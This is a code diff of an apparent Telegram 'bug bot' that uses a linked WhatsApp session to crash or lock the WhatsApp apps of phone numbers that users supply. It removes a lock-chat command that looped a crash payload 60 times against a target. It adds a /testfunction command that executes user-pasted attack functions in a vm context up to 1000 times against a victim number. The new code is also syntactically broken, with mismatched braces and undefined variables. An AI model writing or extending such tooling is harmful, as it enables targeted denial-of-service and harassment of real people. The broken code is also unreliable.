@@ -1166,8 +1166,7 @@ bot.action("xbugs", async (ctx) => {
 
 ╭═───⊱『 ✨𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
 ◇ /androidcrash - Crash Android 
-◇ /attackChanel - Attack Chanel WhatsApp
-◇ /lockChat - Lock Chat And Crash
+◇ /testfunction - Test Your Function
 </pre>
 `;
 
@@ -2242,38 +2241,142 @@ bot.command("androidcrash", checkAllPremium, checkWhatsAppConnection, async (ctx
     ctx.reply("❌ Terjadi error");
   }
 });
-/// CASE BUG Lock Chat ///
-bot.command("", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
-  const q = ctx.message.text.split("lockChat")[1];
-  if (!q) return ctx.reply(`🪧 Example: /lockChat 62xxxx`);
-  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+/// CASE TEST FUNCTION ///
+bot.command("testfunction", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
 
-  await ctx.sendPhoto("https://files.catbox.moe/pm6sti.jpg", {
-    caption: `
-<pre>交 Gxion System Attacks ᝄ
-─ 𝙱𝚞𝚐 𝚜𝚞𝚌𝚌𝚎𝚜 𝚍𝚒𝚔𝚒𝚛𝚒𝚖 𝚔𝚎 𝚝𝚊𝚛𝚐𝚎𝚝,. 𝙶𝚞𝚗𝚊𝚔𝚊𝚗𝚕𝚊𝚑 𝚜𝚎𝚌𝚊𝚛𝚊 𝚋𝚒𝚓𝚊𝚔 𝚍𝚊𝚗 𝚓𝚊𝚗𝚐𝚊𝚗 𝚍𝚒 𝚜𝚊𝚕𝚊𝚑𝚐𝚞𝚗𝚊𝚔𝚊𝚗 👾
-
-"⬡═―━⊱[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 ]⊰━—═⬡
-☇ Target: ${q}
-☇ Status: Succes
-☇ Type: LOCK CHAT AND CRASH WHATSAPP
-</pre>
-`,
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
-    },
-  });
-
-  (async () => {
-    for (let i = 0; i < 60; i++) {
-      console.log(chalk.red(`Send Lock Chat Bugs ${i + 1}/30 To ${q}`));      
-      await VnXLockChat(sock, target);
-      await sleep (1000);
+  try {
+    const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply("🪧 Example : /testfunction 62xxx 10 (reply function)");
     }
-  })();
-});
 
+    const q = args[1];
+    let jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
+
+    if (isNaN(jumlah) || jumlah <= 0) {
+      return bot.sendMessage(chatId, "❌ Jumlah harus angka");    
+
+    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+    if (!msg.reply_to_message || !msg.reply_to_message.text) {
+      return bot.sendMessage(chatId, "❌ Reply dengan function");
+    }
+
+    const processMsg = await bot.sendPhoto(chatId, thumbnailUrlV2, {
+      caption: `
+<pre>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡</pre>
+▢ Target: ${q}
+▢ Type: Unknown Func
+▢ Status: Process Bug
+╘═════════════════⬡
+`,
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            {
+              text: "! Check",
+              url: `https://wa.me/${q}`
+            }
+          ]
+        ]
+      }
+    });
+
+    const processMessageId = processMsg.message_id;
+
+    const safeSock = createSafeSock(sock);
+    const funcCode = msg.reply_to_message.text;
+
+    const matchFunc = funcCode.match(/async function\s+(\w+)/);
+    if (!matchFunc) {
+      return bot.sendMessage(chatId, "❌ Function tidak valid");
+    }
+
+    const funcName = matchFunc[1];
+
+    const vm = require("vm");
+    const context = vm.createContext({
+      console,
+      Buffer,
+      sock: safeSock,
+      target,
+      sleep,
+      generateWAMessageFromContent,
+      generateForwardMessageContent,
+      generateWAMessage,
+      prepareWAMessageMedia,
+      proto,
+      jidDecode,
+      areJidsSameUser
+    });
+
+    // 🔥 FIX UTAMA (wrapper)
+    const wrapper = `${funcCode}\n${funcName}`;
+    const fn = vm.runInContext(wrapper, context);
+
+    // 🔥 FIX LOOP (biar jalan)
+    for (let i = 0; i < jumlah; i++) {
+      try {
+        const arity = fn.length;
+
+        if (arity === 1) {
+          await fn(target);
+        } else if (arity === 2) {
+          await fn(safeSock, target);
+        } else {
+          await fn(safeSock, target, true);
+        }
+      } catch (e) {}
+
+      await sleep(200);
+    }
+
+    const finalText = `
+<pre>╔═══『 GXION 』═══╗</pre>
+Target: ${q}
+Type: Unknown Func
+Status: Success Bug
+╚════════════════╝
+`;
+
+    try {
+      await bot.editMessageCaption(finalText, {
+        chat_id: chatId,
+        message_id: processMessageId,
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [
+            [
+              {
+                text: "! Check",
+                url: `https://wa.me/${q}`
+              }
+            ]
+          ]
+        }
+      });
+    } catch (e) {
+      await bot.sendPhoto(chatId, thumbnailUrlV2, {
+        caption: finalText,
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [
+            [
+              {
+                text: "! Check",
+                url: `https://wa.me/${q}`
+              }
+            ]
+          ]
+        }
+      });
+    }
+
+  } catch (err) {
+    console.error(err);
+  }
+});
+ 
 // ------------ (  FUNCTION BUGS ) -------------- \\
 async function DelayHardNullVnX(sock, target, ptcp = true) {
  
